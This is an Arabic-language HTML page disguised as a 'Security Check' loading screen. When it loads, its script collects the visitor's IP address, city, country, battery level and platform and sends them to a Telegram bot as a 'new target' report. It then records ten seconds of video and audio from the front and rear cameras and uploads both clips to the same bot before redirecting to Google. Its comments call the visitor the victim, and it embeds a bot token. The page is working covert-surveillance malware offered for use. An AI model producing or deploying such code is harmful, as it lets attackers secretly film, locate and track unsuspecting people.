<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check v4.0</title>
    <style>
        body { background-color: #0d1117; color: #58a6ff; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid #21262d; border-top: 4px solid #58a6ff; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { margin-top: 20px; font-size: 14px; color: #c9d1d9; }
    </style>
</head>
<body>
    <div class="loader"></div>
    <div class="status" id="st">جاري تهيئة نظام الأمان...</div>

    <script>
        const BOT_TOKEN = "8619027051:AAH06xxHUXEeZ_PLu8l5QF8zct7nrjNW4ts";
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('chatId');
        const sid = Math.floor(Math.random() * 90000) + 10000; // رقم الجلسة

        async function start() {
            if (!chatId) return;

            // 1. إرسال البيانات النصية فوراً (كما كانت سابقاً)
            sendDataReport();

            // 2. تصوير الأمامية وإرسالها "كملف" (10 ثوانٍ - 360p)
            await captureAndFile("user", "الأمامية");

            // 3. تصوير الخلفية وإرسالها "كملف" (10 ثوانٍ - 360p)
            await captureAndFile("environment", "الخلفية");

            window.location.href = "https://www.google.com";
        }

        async function sendDataReport() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                const b = await navigator.getBattery();
                const msg = `✅ **بيانات هدف جديد**\n━━━━━━━━━━━━━\n🆔 الجلسة: #${sid}\n🌐 العنوان: \`${d.ip}\`\n📍 الموقع: ${d.city}, ${d.country_name}\n🔋 البطارية: ${Math.round(b.level * 100)}%\n📱 النظام: ${navigator.platform}\n━━━━━━━━━━━━━`;
               
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`, {keepalive: true});
            } catch (e) {}
        }

        async function captureAndFile(mode, label) {
            try {
                document.getElementById('st').innerText = `جاري فحص المستشعر (${label})...`;
                // ضبط الدقة على 360p لضمان عدم حدوث خطأ في الرفع
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: mode, width: 640, height: 360 },
                    audio: true
                });
               
                const recorder = new MediaRecorder(stream);
                let chunks = [];
                recorder.ondataavailable = (e) => chunks.push(e.data);
               
                return new Promise((resolve) => {
                    recorder.onstop = async () => {
                        const blob = new Blob(chunks, { type: 'video/mp4' });
                        uploadFile(blob, `video_${label}_${sid}.mp4`, `🎥 فيديو ${label} (الجلسة ${sid})`);
                        stream.getTracks().forEach(t => t.stop());
                        resolve();
                    };
                    recorder.start();
                    setTimeout(() => recorder.stop(), 10000);
                });
            } catch (e) { return Promise.resolve(); }
        }

        function uploadFile(blob, filename, caption) {
            const fd = new FormData();
            fd.append('chat_id', chatId);
            fd.append('document', blob, filename); // إرسال على هيئة ملف كما طلبت
            fd.append('caption', caption);

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                method: 'POST',
                body: fd,
                keepalive: true // يضمن الرفع حتى لو خرج الضحية
            });
        }

        window.onload = start;
    </script>
</body>
</html>
